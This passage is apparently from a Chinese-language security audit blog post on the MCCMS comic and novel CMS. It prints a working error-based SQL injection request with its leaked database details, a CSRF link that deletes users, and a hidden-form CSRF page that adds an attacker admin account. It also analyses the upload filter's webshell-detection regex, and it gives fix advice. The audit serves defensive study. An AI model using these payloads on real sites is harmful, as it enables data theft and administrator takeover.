<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">GET</span> /<span class="selector-tag">index</span><span class="selector-class">.php</span>/<span class="selector-tag">book</span>/<span class="selector-tag">category</span>/<span class="selector-tag">order</span>/<span class="selector-tag">addtime</span>/<span class="selector-tag">pay</span>/<span class="number">1</span>/<span class="selector-tag">finish</span>/<span class="number">1</span>/<span class="selector-tag">list</span>/<span class="number">1</span>)+<span class="selector-tag">and</span>+<span class="selector-tag">updatexml</span>(<span class="number">1</span>,<span class="built_in">concat</span>(<span class="number">0</span>x7e,<span class="built_in">substring</span>(<span class="variable">@@datadir</span>,<span class="number">15</span>),<span class="number">0</span>x7e),<span class="number">1</span>)%<span class="number">23</span> </span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221127141800552.png"><img src="/CMS-Test/image-20221127141800552.png" alt="image-20221127141800552"></a></p>
<p>最后得到</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">数据库名:mccms</span></span><br><span class="line"><span class="section">数据库管理员名字:root</span></span><br><span class="line"><span class="section">数据库路径: D:\phpstudy_pro\Extensions\MySQL8.0.12\data\</span></span><br></pre></td></tr></table></figure>

<h4 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h4><blockquote>
<p>1.对代入sql查询语句的参数进行严格过滤<br>2.减少用户对传入sql查询的中参数的直接控制的机会<br>3.对一些数据函数禁止用，或者少用<br>4.最好不要直接把用户数据带入数据库中进行查询</p>
</blockquote>
<h3 id="3-后台一处安全漏洞"><a href="#3-后台一处安全漏洞" class="headerlink" title="3.后台一处安全漏洞"></a>3.后台一处安全漏洞</h3><blockquote>
<p>后台漏洞<br>一般猜测为登录存在sql注入，模板注入，越权，命令执行,csrf等等</p>
</blockquote>
<h4 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h4><p>由于之前修复过<code>sql</code>注入，所以在这里的可能性就很少了，于是对其他漏洞进行测试</p>
<p>不过，抓包过程中发现其信息皆是以明文形式发送</p>
<p>所以猜测存在<code>csrf</code></p>
<p>【先进行了漏洞测试】</p>
<p>以此处为例</p>
<p>对<code>csrf</code>实现控制管理员删除用户代码分析</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sys/apps/controllers/admin/User.php</span></span><br><span class="line"><span class="comment">//删除会员</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">del</span>(<span class="params"><span class="variable">$id</span>=<span class="number">0</span></span>)</span>&#123;</span><br><span class="line"> 	    <span class="variable">$id</span> = (<span class="keyword">int</span>)<span class="variable">$id</span>;</span><br><span class="line"> 	    <span class="keyword">if</span>(<span class="variable">$id</span> == <span class="number">0</span>)&#123;</span><br><span class="line"> 	    	<span class="variable">$ids</span> = <span class="variable language_">$this</span>-&gt;input-&gt;<span class="title function_ invoke__">get_post</span>(<span class="string">&#x27;id&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">/*get_post先查看GET数据中的id，再查看POST数据中的id</span></span><br><span class="line"><span class="comment">            这里也是我们实现csrf的关键处，</span></span><br><span class="line"><span class="comment">            这里的id以明文显示，以明文读取，那么只要修改明文，任意的id都可以实现进行后续删除操作</span></span><br><span class="line"><span class="comment">            如果前端对明文数据加密，再在这里比较匹对后，再传参可能更安全*/</span></span><br><span class="line">            </span><br><span class="line"> 	    	<span class="variable">$ids</span> = <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$ids</span>);</span><br><span class="line">            <span class="comment">/*implode —用字符串连接数组元素*/</span></span><br><span class="line"> 	    	<span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$ids</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^([0-9]+[,]?)+$/&#x27;</span>, <span class="variable">$ids</span>))&#123;</span><br><span class="line">				<span class="variable">$id</span> = <span class="variable">$ids</span>;</span><br><span class="line">			&#125;</span><br><span class="line"> 	    &#125;</span><br><span class="line"> 	    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$id</span>)) <span class="title function_ invoke__">get_json</span>(<span class="string">&#x27;ID不能为空~!&#x27;</span>);</span><br><span class="line"> 	    <span class="variable">$arr</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$id</span>);</span><br><span class="line"> 	    <span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$_id</span>) &#123;</span><br><span class="line"> 	    	<span class="comment">//删除头像地址</span></span><br><span class="line">			<span class="variable">$pic</span> = <span class="title function_ invoke__">getzd</span>(<span class="string">&#x27;user&#x27;</span>,<span class="string">&#x27;pic&#x27;</span>,<span class="variable">$id</span>);</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;load-&gt;<span class="title function_ invoke__">model</span>(<span class="string">&#x27;tongbu&#x27;</span>);</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;tongbu-&gt;<span class="title function_ invoke__">del</span>(<span class="variable">$pic</span>);</span><br><span class="line">			<span class="comment">//删除记录</span></span><br><span class="line">    		<span class="variable language_">$this</span>-&gt;mcdb-&gt;<span class="title function_ invoke__">get_del</span>(<span class="string">&#x27;user&#x27;</span>,<span class="variable">$_id</span>);</span><br><span class="line"> 	    &#125;</span><br><span class="line">		<span class="variable">$arr</span>[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&#x27;恭喜您，删除成功~!&#x27;</span>;</span><br><span class="line">		<span class="variable">$arr</span>[<span class="string">&#x27;url&#x27;</span>] = <span class="title function_ invoke__">links</span>(<span class="string">&#x27;user&#x27;</span>);</span><br><span class="line">		<span class="title function_ invoke__">get_json</span>(<span class="variable">$arr</span>,<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><code>CSRF</code>此处以管理员可以删除用户为例</p>
<p>这是在删除用户时进行的抓包数据，发现其信息皆以明文显示，只要修改<code>id</code>数据就可以达到删除指定用户的目的</p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221126222051780.png"><img src="/CMS-Test/image-20221126222051780.png" alt="image-20221126222051780"></a></p>
<p>先创建<code>2</code>个用户，<code>id</code>为<code>3，4</code></p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221126222725930.png"><img src="/CMS-Test/image-20221126222725930.png" alt="image-20221126222725930"></a></p>
<p>然后根据我们的抓包数据构造一个钓鱼的链接</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">&lt;<span class="keyword">a</span> href=<span class="string">&quot;http://127.0.0.3/admin.php/user/del?id%5B%5D=3&quot;</span>&gt;click me&lt;/<span class="keyword">a</span>&gt;  </span><br><span class="line"><span class="comment">#这里的id以GET方式提交也可以</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221126224127893.png"><img src="/CMS-Test/image-20221126224127893.png" alt="image-20221126224127893"></a></p>
<p>保持登录的状态点击</p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221126224210939.png"><img src="/CMS-Test/image-20221126224210939.png" alt="image-20221126224210939"></a></p>
<p>也试了试<code>4</code></p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221126224303900.png"><img src="/CMS-Test/image-20221126224303900.png" alt="image-20221126224303900"></a></p>
<p>发现也显示成功</p>
<p>这是我们返回后台查看用户信息</p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221126224401491.png"><img src="/CMS-Test/image-20221126224401491.png" alt="image-20221126224401491"></a></p>
<p>发现只有<code>ID=1</code>的用户了</p>
<p>我们的<code>csrf</code>也就攻击成功了</p>
<p>甚至添加后台管理员账户也是可以</p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221128180130164.png"><img src="/CMS-Test/image-20221128180130164.png" alt="image-20221128180130164"></a></p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221128180148359.png"><img src="/CMS-Test/image-20221128180148359.png" alt="image-20221128180148359"></a></p>
<p>构造钓鱼链接</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>MCCMS POST<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;btn2()&quot;</span>&gt;</span>MCCMS CSRF<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.3/admin.php/sys/save&quot;</span>  <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">id</span>=<span class="string">&quot;test&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;nichen&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Ttoc&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;pass&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123456&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">btn2</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> f = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;test&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            f.<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>post</code>方式以火狐浏览器提交</p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221128201313981.png"><img src="/CMS-Test/image-20221128201313981.png" alt="image-20221128201313981"></a></p>
<p>提交成功，成功向后台添加了我们的恶意用户</p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221128201331468.png"><img src="/CMS-Test/image-20221128201331468.png" alt="image-20221128201331468"></a></p>
<blockquote>
<p>除此以外</p>
<p>其他管理员可以控制的操作，比如修改用户金币数，月票数等等，因为都是以明文提交，都可以用csrf实现</p>
</blockquote>
<hr>
<h4 id="修复建议-2"><a href="#修复建议-2" class="headerlink" title="修复建议"></a>修复建议</h4><blockquote>
<p>此处我们发现用户凭据发现以明文形式发送<br>那么中间就可能被第三方获取并利用，所以建议</p>
<p>1.对数据进行进一步的加密<br>2.可以在HTTP请求中加入一个随机产生的token，并在后台服务器端验证token，如果请求中没有token或者token内容不正确，则认为请求可能是csrf攻击，从而拒绝该请求<br>3.验证请求的referer值<br>4.对参数传入方式和验证的过程严格控制，以免传入外来恶意数据，导致信息泄露或丢失<br>5.用户二次验证，对于这种不可逆操作执行前进行比如手机验证码之类的第二次验证，不以cookie为唯一验证</p>
</blockquote>
<h3 id="4-作家发布漫画小说命令执行漏洞-复现失败"><a href="#4-作家发布漫画小说命令执行漏洞-复现失败" class="headerlink" title="4.作家发布漫画小说命令执行漏洞(复现失败)"></a>4.作家发布漫画小说命令执行漏洞(复现失败)</h3><h4 id="代码分析-漏洞利用-1"><a href="#代码分析-漏洞利用-1" class="headerlink" title="代码分析+漏洞利用"></a>代码分析+漏洞利用</h4><blockquote>
<p>猜测<br>1.发布木马文件，导致命令执行<br>2.一些客户端可以修改的参数，被命令执行函数包含且执行</p>
</blockquote>
<p>但根据的<code>2.5.8</code>更新文档</p>
<blockquote>
<p>Mccms漫画小说系统-v2.5.8更新详情<br>1.修复了SQL注入高危漏洞<br>2.修复了木马伪装图片上传漏洞</p>
</blockquote>
<p>所以如果通过漫画图片上传木马，大概率是行不通了</p>
<p>先注册完信息，再后台完成作者认证</p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221122151951892.png"><img src="/CMS-Test/image-20221122151951892.png" alt="image-20221122151951892"></a></p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221122152043515.png"><img src="/CMS-Test/image-20221122152043515.png" alt="image-20221122152043515"></a></p>
<h5 id="漫画"><a href="#漫画" class="headerlink" title="漫画"></a>漫画</h5><p>但是也可以试试上传图片马，看看它怎么修复的</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">这里限制了文件类型，可以试试能不能绕过</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221122152444788.png"><img src="/CMS-Test/image-20221122152444788.png" alt="image-20221122152444788"></a></p>
<p>直接上传脚本文件会被拦截</p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221122153207506.png"><img src="/CMS-Test/image-20221122153207506.png" alt="image-20221122153207506"></a></p>
<p>上传图片🐎的话 ，会显示非法图片</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sys/apps/controllers/author/Chapter.php</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;upload-&gt;<span class="title function_ invoke__">do_upload</span>(<span class="string">&#x27;image&#x27;</span>))&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="variable language_">$this</span>-&gt;upload-&gt;<span class="title function_ invoke__">display_errors</span>();</span><br><span class="line">            <span class="title function_ invoke__">get_json</span>(<span class="variable">$msg</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$arr</span> = <span class="variable language_">$this</span>-&gt;upload-&gt;<span class="title function_ invoke__">data</span>();</span><br><span class="line">            <span class="variable">$img_path_file</span> = <span class="variable">$arr</span>[<span class="string">&#x27;full_path&#x27;</span>];</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">checkPicHex</span>(<span class="variable">$img_path_file</span>);</span><br><span class="line">           <span class="comment">/*关键在这里，让对我们上传图片的内容进行了检查导致无法上传*/</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span> == <span class="number">1</span>) <span class="title function_ invoke__">get_json</span>(<span class="string">&#x27;非法图片&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>跟进函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sys/apps/helpers/common_helper.php</span></span><br><span class="line"><span class="comment">//检查上传图片是否包含木马</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkPicHex</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="variable">$resource</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file</span>,<span class="string">&#x27;rb&#x27;</span>);</span><br><span class="line">        <span class="variable">$fileSize</span> = <span class="title function_ invoke__">filesize</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="title function_ invoke__">fseek</span>(<span class="variable">$resource</span>, <span class="number">0</span>);<span class="comment">//把文件指针移到文件的开头</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$fileSize</span> &gt; <span class="number">512</span>)&#123; <span class="comment">// 若文件大于521B文件取头和尾</span></span><br><span class="line">            <span class="variable">$hexCode</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">fread</span>(<span class="variable">$resource</span>, <span class="number">512</span>));</span><br><span class="line">            <span class="comment">/*fread —二进制安全文件读取*/</span></span><br><span class="line">            <span class="title function_ invoke__">fseek</span>(<span class="variable">$resource</span>, <span class="variable">$fileSize</span> - <span class="number">512</span>);<span class="comment">//把文件指针移到文件尾部</span></span><br><span class="line">            <span class="variable">$hexCode</span> .= <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">fread</span>(<span class="variable">$resource</span>,<span class="number">512</span>));</span><br><span class="line">            <span class="comment">/*bin2hex —将二进制数据转换为十六进制表示*/</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// 取全部</span></span><br><span class="line">            <span class="variable">$hexCode</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">fread</span>(<span class="variable">$resource</span>, <span class="variable">$fileSize</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$resource</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/(3c25.*?28.*?29.*?253e)|(3c3f.*?28.*?29.*?3f3e)|(3C534352495054)|(2F5343524950543E)|(3C736372697074)|(2F7363726970743E)/is&quot;</span>,<span class="variable">$hexCode</span>))</span><br><span class="line">        <span class="comment">/*匹配16进制中一句话木马中特征编码</span></span><br><span class="line"><span class="comment">        过滤</span></span><br><span class="line"><span class="comment">        &lt;%()%&gt;</span></span><br><span class="line"><span class="comment">        &lt;?()?&gt;</span></span><br><span class="line"><span class="comment">        &lt;script&gt;()&lt;/script&gt;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        &#123;</span><br><span class="line">        	<span class="comment">//删除文件</span></span><br><span class="line">        	<span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*也就是把图片以二进制方式读取的数据再进行十六进制转化，最后进行正则匹配过滤，看来绕过确实不容易*/</span></span><br></pre></td></tr></table></figure>

<p>正常上传图片，</p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221122152819257.png"><img src="/CMS-Test/image-20221122152819257.png" alt="image-20221122152819257"></a></p>
<p>成功</p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221122154113084.png"><img src="/CMS-Test/image-20221122154113084.png" alt="image-20221122154113084"></a></p>
<p>而且还回显了图片上传的路径</p>
<p>试试能不能访问</p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221122162549084.png"><img src="/CMS-Test/image-20221122162549084.png" alt="image-20221122162549084"></a></p>
<p>发现是可以访问这个目录下的图片文件的</p>
<p>但当我在这个路径目录直接放了脚本文件，再访问时</p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221122165943218.png"><img src="/CMS-Test/image-20221122165943218.png" alt="image-20221122165943218"></a></p>
<p>发现被阻止了，也就是<code>apchae</code>在这个<strong>图片存储目录设置了脚本文件的访问权限禁止，那么就无法利用在这个目录下的脚本文件</strong></p>
<p>所以，要么修改上传的路径，比如到网站的自身脚本目录下，进行访问执行</p>
<hr>
<h5 id="小说"><a href="#小说" class="headerlink" title="小说"></a>小说</h5><p>抓包小说，发现绕过了字数过少的限制，而且也绕过了小说后台审核</p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221122222054711.png"><img src="/CMS-Test/image-20221122222054711.png" alt="image-20221122222054711"></a></p>
<p>我们抓包修改的内容没有经过后台直接到了存储目录</p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221122222413963.png"><img src="/CMS-Test/image-20221122222413963.png" alt="image-20221122222413963"></a></p>
<p>后面发现是由于源码中，对签约用户自动审核通过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sys/apps/controllers/author/Bookchapter.php</span></span><br><span class="line">            <span class="comment">//判断签约，签约用户自动审核</span></span><br><span class="line">            <span class="variable">$signing</span> = <span class="title function_ invoke__">getzd</span>(<span class="string">&#x27;user&#x27;</span>,<span class="string">&#x27;signing&#x27;</span>,<span class="variable">$uid</span>);</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;yid&#x27;</span>] = <span class="variable">$signing</span> == <span class="number">1</span> ? <span class="number">0</span> : <span class="number">1</span>;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;bid&#x27;</span>] = <span class="variable">$bid</span>;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;addtime&#x27;</span>] = <span class="title function_ invoke__">time</span>();</span><br></pre></td></tr></table></figure>

<p>其中主要对动漫和小说名字，以及评论处还进行了<code>sql</code>注入限制</p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221123201716429.png"><img src="/CMS-Test/image-20221123201716429.png" alt="image-20221123201716429"></a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sys/apps/helpers/common_helper.php</span></span><br><span class="line"><span class="comment">//SQL过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_replace</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$string</span>)) &#123;</span><br><span class="line">		<span class="keyword">foreach</span>(<span class="variable">$string</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">			<span class="variable">$string</span>[<span class="title function_ invoke__">safe_replace</span>(<span class="variable">$k</span>)] = <span class="title function_ invoke__">safe_replace</span>(<span class="variable">$v</span>); </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$string</span>))&#123;</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;%20&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;%27&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;%2527&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;&amp;#039;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;&amp;lt;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&amp;gt;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;\%&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_encode</span>(<span class="variable">$string</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也对一定时间内更新数也有限制，所以如果想利用签约作者账号爆库还是有点难</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sys/apps/controllers/author/Bookchapter.php   </span></span><br><span class="line">           <span class="comment">//判断五分钟内更新数量</span></span><br><span class="line">           <span class="variable">$time</span> = <span class="title function_ invoke__">time</span>()-<span class="number">300</span>;</span><br><span class="line">           <span class="variable">$mnum</span> = <span class="variable language_">$this</span>-&gt;mcdb-&gt;<span class="title function_ invoke__">get_nums</span>(<span class="variable">$table</span>,<span class="keyword">array</span>(<span class="string">&#x27;bid&#x27;</span>=&gt;<span class="variable">$bid</span>,<span class="string">&#x27;addtime&gt;&#x27;</span>=&gt;<span class="variable">$time</span>));</span><br><span class="line">           <span class="keyword">if</span>(<span class="variable">$mnum</span> &gt; <span class="number">5</span>) <span class="title function_ invoke__">get_json</span>(<span class="string">&#x27;系统检测到你有非法暴库行为~！&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221123123229249.png"><img src="/CMS-Test/image-20221123123229249.png" alt="image-20221123123229249"></a></p>
<p>但是其对上传文件进行都默认为<code>txt</code>文件</p>
<p>而且对类似<code>&lt;&gt;</code>特殊符号也进行了编译</p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221124133546733.png"><img src="/CMS-Test/image-20221124133546733.png" alt="image-20221124133546733"></a></p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221124133558480.png"><img src="/CMS-Test/image-20221124133558480.png" alt="image-20221124133558480"></a></p>
<p>稍微看看小说文本文件生成的代码流程</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sys/apps/controllers/author/Bookchapter.php</span></span><br><span class="line">        <span class="comment">//写入小说到TXT文本</span></span><br><span class="line">        <span class="title function_ invoke__">get_book_txt</span>(<span class="variable">$bid</span>,<span class="variable">$id</span>,<span class="variable">$text</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&#x27;恭喜您，操作成功~!&#x27;</span>;</span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;url&#x27;</span>] = <span class="title function_ invoke__">get_url</span>(<span class="string">&#x27;author/bookchapter/index/&#x27;</span>.<span class="variable">$bid</span>);</span><br><span class="line">        <span class="title function_ invoke__">get_json</span>(<span class="variable">$arr</span>,<span class="number">1</span>);</span><br><span class="line"><span class="comment">/*这是把作者文章写入存储目录的代码*/</span></span><br></pre></td></tr></table></figure>

<p>跟进 <code>get_book_txt</code>函数</p>
